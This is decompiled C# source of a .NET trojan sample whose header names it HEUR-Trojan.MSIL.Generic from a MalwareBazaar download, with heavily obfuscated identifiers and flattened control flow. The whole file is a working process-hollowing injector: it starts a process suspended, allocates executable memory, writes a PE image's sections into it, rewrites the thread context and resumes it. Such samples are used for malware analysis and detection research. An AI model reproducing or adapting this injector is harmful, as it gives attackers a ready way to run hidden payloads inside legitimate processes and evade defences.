// Decompiled with JetBrains decompiler
// Type: Ⴗ.Ⴍ
// Assembly: ROD, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E979E2DB-C9F1-42A2-973C-8D09E8A5042D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan.MSIL.Generic-6729ed2ad627d1ba321c50ea02bf4839564ecf122398fe54f78429c0e1c190c4.exe

using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Ⴗ
{
  [StandardModule]
  internal sealed class Ⴍ
  {
    [DllImport("kernel32", EntryPoint = "LoadLibraryA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr Ⴀ([MarshalAs(UnmanagedType.VBByRefStr)] ref string Ⴓ);

    [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr Ⴗ(IntPtr Ⴈ, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Ⴀ);

    public static T Ⴍ<T>(string Ⴃ, string Ⴗ)
    {
label_3:
      // ISSUE: type reference
      T obj = (T) MyApplication.Ⴍ(Ⴗ.Ⴍ.Ⴗ(Ⴗ.Ⴍ.Ⴀ(ref Ⴃ), ref Ⴗ), Ⴗ.Ⴅ.Ⴓ(__typeref (T), 632, 525), 894, 791);
      int num = 5;
      while (true)
      {
        switch (num)
        {
          case 1:
          case 5:
            goto label_4;
          case 4:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴍ.Ⴍ);
            num = 4;
            continue;
        }
      }
label_4:
      return obj;
    }

    [DllImport("kernel32", EntryPoint = "CreateProcessW", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool Ⴀ(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string Ⴓ,
      StringBuilder Ⴍ,
      IntPtr Ⴅ,
      IntPtr Ⴃ,
      [MarshalAs(UnmanagedType.Bool)] bool Ⴈ,
      int Ⴀ,
      IntPtr Ⴐ,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string Ⴗ,
      byte[] Ⴄ,
      IntPtr[] Ⴜ);

    private static int Ⴈ(long Ⴄ, long Ⴐ = 4)
    {
label_3:
      Ⴗ.Ⴍ.Ⴃ ⴃ = Ⴗ.Ⴍ.Ⴍ<Ⴗ.Ⴍ.Ⴃ>(Ⴗ.Ⴗ.Ⴃ(198506055, 1), Ⴗ.Ⴗ.Ⴃ(198506106, 4));
      IntPtr Ⴅ = Ⴗ.Ⴗ.Ⴅ(Ⴗ.Ⴗ.Ⴐ(862, 829), 678, 666);
      IntPtr Ⴍ = Ⴗ.Ⴍ.Ⴅ(Ⴄ, 890, 795);
      IntPtr num1;
      ref IntPtr local1 = ref num1;
      int Ⴐ1 = checked ((int) Ⴐ);
      int num2;
      IntPtr num3 = Ⴗ.Ⴅ.Ⴈ(num2, 457, 443);
      ref IntPtr local2 = ref num3;
      int num4 = ⴃ(Ⴅ, Ⴍ, ref local1, Ⴐ1, ref local2) ? 1 : 0;
      int num5 = 3;
      while (true)
      {
        switch (num5)
        {
          case 0:
          case 4:
            goto label_5;
          case 1:
            goto label_3;
          case 3:
          case 5:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴍ.Ⴈ);
            num5 = 1;
            continue;
        }
      }
label_4:
      num2 = (int) num3;
label_5:
      return (int) num1;
    }

    public static bool Ⴀ(byte[] Ⴍ, string Ⴗ)
    {
      bool flag;
      try
      {
        int num1 = 15;
        GCHandle gcHandle;
        int num2;
        IntPtr zero;
        IntPtr[] numArray1;
        byte[] numArray2;
        int num3;
        uint[] numArray3;
        int num4;
        int num5;
        Ⴗ.Ⴍ.Ⴈ ⴈ;
        IntPtr Ⴃ1;
        IntPtr num6;
        IntPtr Ⴃ2;
        Ⴗ.Ⴍ.Ⴜ ⴜ;
        int num7;
        int num8;
        int[] numArray4;
        byte[] Ⴓ;
        int Ⴍ1;
        while (true)
        {
          switch (num1)
          {
            case 0:
              Ⴃ2 = new IntPtr(Ⴗ.Ⴍ.ႣႠ(Ⴍ, checked (num3 + 80), 707, 728));
              num1 = 25;
              continue;
            case 1:
              num4 = checked (num2 + Ⴗ.Ⴍ.Ⴈ((long) (num2 + 60)));
              num1 = 6;
              continue;
            case 3:
            case 26:
              Ⴃ1 = Ⴗ.Ⴍ.Ⴍ<Ⴗ.Ⴍ.Ⴐ>(Ⴗ.Ⴗ.Ⴃ(198506122, 7), Ⴗ.Ⴗ.Ⴃ(198506126, 8))(numArray1[0], Ⴗ.Ⴅ.Ⴈ(num5, 916, 998), Ⴗ.Ⴅ.Ⴈ(Ⴗ.Ⴍ.Ⴈ((long) checked (num4 + 80)), 966, 948), 12288, 64);
              num1 = 12;
              continue;
            case 4:
              goto label_26;
            case 5:
              Ⴗ.Ⴅ.Ⴐ(ref gcHandle, 372, 333);
              zero = IntPtr.Zero;
              numArray1 = new IntPtr[4];
              num1 = 23;
              continue;
            case 6:
              num5 = Ⴗ.Ⴍ.Ⴈ((long) checked (num4 + 52));
              ⴈ = Ⴗ.Ⴍ.Ⴍ<Ⴗ.Ⴍ.Ⴈ>(Ⴗ.Ⴗ.Ⴃ(198506054, 0), Ⴗ.Ⴗ.Ⴃ(198506082, 6));
              num1 = 21;
              continue;
            case 7:
              num1 = num8 <= num7 ? 22 : 24;
              continue;
            case 8:
              num6 = new IntPtr(Ⴓ.Length);
              int num9 = ⴜ(numArray1[0], Ⴃ2, Ⴓ, checked ((uint) Ⴗ.Ⴍ.Ⴓ(num6, 852, 794)), Ⴍ1) ? 1 : 0;
              goto case 11;
            case 9:
              Ⴓ = new byte[checked (numArray4[4] - 1 + 1)];
              MyApplication.Ⴅ((Array) Ⴍ, numArray4[5], (Array) Ⴓ, 0, Ⴓ.Length, 215, 175);
              goto case 13;
            case 10:
              numArray3[44] = checked ((uint) (num5 + Ⴗ.Ⴍ.Ⴈ((long) (num4 + 40))));
              num1 = 20;
              continue;
            case 11:
              num1 = 17;
              continue;
            case 12:
              num6 = new IntPtr(Ⴗ.Ⴍ.ႣႠ(Ⴍ, checked (num3 + 52), 315, 288));
              num1 = 0;
              continue;
            case 13:
              num1 = 14;
              continue;
            case 14:
              Ⴃ2 = new IntPtr(checked (Ⴗ.Ⴃ.Ⴍ(ref Ⴃ1, 428, 426) + numArray4[3]));
              num1 = 8;
              continue;
            case 16:
              int num10 = ⴜ(numArray1[0], Ⴗ.Ⴍ.Ⴅ(checked ((long) numArray3[41] + 8L), 518, 615), MyComputer.Ⴐ(Ⴗ.Ⴃ.Ⴍ(ref Ⴃ1, 884, 882), 823, 853), 4U, Ⴍ1) ? 1 : 0;
              num1 = 10;
              continue;
            case 17:
              checked { ++num8; }
              num1 = 7;
              continue;
            case 18:
              num7 = checked (Ⴗ.Ⴍ.Ⴈ((long) (num4 + 6), 2L) - 1);
              num8 = 0;
              num1 = 7;
              continue;
            case 19:
              numArray3 = new uint[179];
              numArray3[0] = 65538U;
              string str1 = (string) null;
              ref string local1 = ref str1;
              StringBuilder Ⴍ2 = new StringBuilder(Ⴗ);
              IntPtr Ⴅ = zero;
              IntPtr Ⴃ3 = zero;
              IntPtr Ⴐ = zero;
              string str2 = (string) null;
              ref string local2 = ref str2;
              byte[] Ⴄ = numArray2;
              IntPtr[] Ⴜ = numArray1;
              Ⴗ.Ⴍ.Ⴀ(ref local1, Ⴍ2, Ⴅ, Ⴃ3, false, 4, Ⴐ, ref local2, Ⴄ, Ⴜ);
              num1 = 1;
              continue;
            case 20:
              int num11 = Ⴗ.Ⴍ.Ⴍ<Ⴗ.Ⴍ.Ⴗ>(Ⴗ.Ⴗ.Ⴃ(198506052, 2), Ⴗ.Ⴗ.Ⴃ(198506178, 7))(numArray1[1], numArray3) ? 1 : 0;
              num1 = 4;
              continue;
            case 21:
              int num12 = (int) ⴈ(numArray1[0], Ⴗ.Ⴅ.Ⴈ(num5, 434, 448));
              num1 = 3;
              continue;
            case 22:
              numArray4 = new int[10];
              MyApplication.Ⴅ((Array) Ⴍ, checked (num3 + 248 + num8 * 40), (Array) numArray4, 0, 40, 340, 300);
              num1 = 9;
              continue;
            case 23:
              numArray2 = new byte[68];
              num3 = Ⴗ.Ⴍ.ႣႠ(Ⴍ, 60, 181, 174);
              num1 = 19;
              continue;
            case 24:
              int num13 = Ⴗ.Ⴍ.Ⴍ<Ⴗ.Ⴍ.Ⴄ>(Ⴗ.Ⴗ.Ⴃ(198506053, 3), Ⴗ.Ⴗ.Ⴃ(198506207, 1))(numArray1[1], numArray3) ? 1 : 0;
              num1 = 16;
              continue;
            case 25:
              ⴜ = Ⴗ.Ⴍ.Ⴍ<Ⴗ.Ⴍ.Ⴜ>(Ⴗ.Ⴗ.Ⴃ(198506062, 8), Ⴗ.Ⴗ.Ⴃ(198506163, 2));
              int Ⴍ3;
              int num14 = ⴜ(numArray1[0], Ⴃ1, Ⴍ, checked ((uint) Ⴗ.Ⴍ.Ⴈ((long) (num4 + 84))), Ⴍ3) ? 1 : 0;
              num1 = 18;
              continue;
            default:
              gcHandle = Ⴗ.Ⴐ.Ⴍ((object) Ⴍ, GCHandleType.Pinned, 627, 570);
              num2 = Ⴗ.Ⴍ.Ⴓ(MyComputer.Ⴀ(ref gcHandle, 397, 418), 119, 57);
              num1 = 5;
              continue;
          }
        }
label_26:
        int num15 = (int) Ⴗ.Ⴍ.Ⴍ<Ⴗ.Ⴍ.Ⴀ>(Ⴗ.Ⴗ.Ⴃ(198506052, 2), Ⴗ.Ⴗ.Ⴃ(198506232, 8))(numArray1[1], (IntPtr) 0);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
        goto label_31;
      }
      int num = 0;
      while (true)
      {
        switch (num)
        {
          case 4:
            goto label_31;
          default:
            flag = true;
            num = 4;
            continue;
        }
      }
label_31:
      return flag;
    }

    internal static IntPtr Ⴅ([In] long obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 97:
          num1 = 1;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 3:
          case 5:
          case 7:
            goto label_3;
          case 1:
            goto label_8;
          case 2:
            num2 = 7;
            continue;
          case 6:
            num2 = 7;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴍ.Ⴅ);
            num2 = 7;
            continue;
        }
      }
label_8:
      return (IntPtr) obj0;
    }

    internal static int Ⴓ([In] IntPtr obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 78:
          num1 = 1;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 4:
            goto label_8;
          case 2:
            goto label_3;
          case 3:
            num2 = 2;
            continue;
          case 6:
          case 7:
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴍ.Ⴓ);
            num2 = 2;
            continue;
        }
      }
label_8:
      return (int) obj0;
    }

    internal static int ႣႠ([In] byte[] obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 27:
          num1 = 5;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 4:
          case 6:
            num2 = 7;
            continue;
          case 3:
            num2 = 7;
            continue;
          case 5:
            goto label_8;
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴍ.ႣႠ);
            num2 = 7;
            continue;
        }
      }
label_8:
      return BitConverter.ToInt32(obj0, obj1);
    }

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool Ⴄ(IntPtr Ⴃ, uint[] Ⴓ);

    public delegate uint Ⴈ(IntPtr Ⴈ, IntPtr Ⴃ);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool Ⴃ(IntPtr Ⴅ, IntPtr Ⴍ, ref IntPtr Ⴈ, int Ⴐ, ref IntPtr Ⴗ);

    public delegate uint Ⴀ(IntPtr Ⴗ, IntPtr Ⴃ);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool Ⴗ(IntPtr Ⴍ, uint[] Ⴄ);

    public delegate IntPtr Ⴐ(IntPtr Ⴄ, IntPtr Ⴓ, IntPtr Ⴗ, int Ⴍ, int Ⴅ);

    public delegate bool Ⴜ(IntPtr Ⴗ, IntPtr Ⴃ, byte[] Ⴓ, uint Ⴄ, int Ⴍ);
  }
}
